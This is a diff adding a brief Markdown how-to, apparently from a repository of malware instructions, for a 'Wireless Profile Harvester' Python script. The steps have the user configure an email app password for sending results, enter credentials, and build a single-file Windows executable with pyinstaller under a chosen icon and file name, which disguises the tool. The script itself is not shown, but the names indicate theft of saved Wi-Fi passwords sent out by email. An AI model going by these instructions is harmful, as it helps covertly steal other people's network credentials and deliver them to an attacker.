+++ HowTo/Malwares/WirelessProfileHarvester.md
@@ -1,0 +1,7 @@
+# Wireless Profile Harvester
+
+## HOW to use
+
+- Read [HowTo/Malwares/SendEmail.md](./SendEmail.md) to and use app password
+- Update email id and password (app password)
+- Create exe: pyinstaller.exe --onefile --icon='icon_path' -n 'name_of_file' .\wireless_profile_harvestor.py
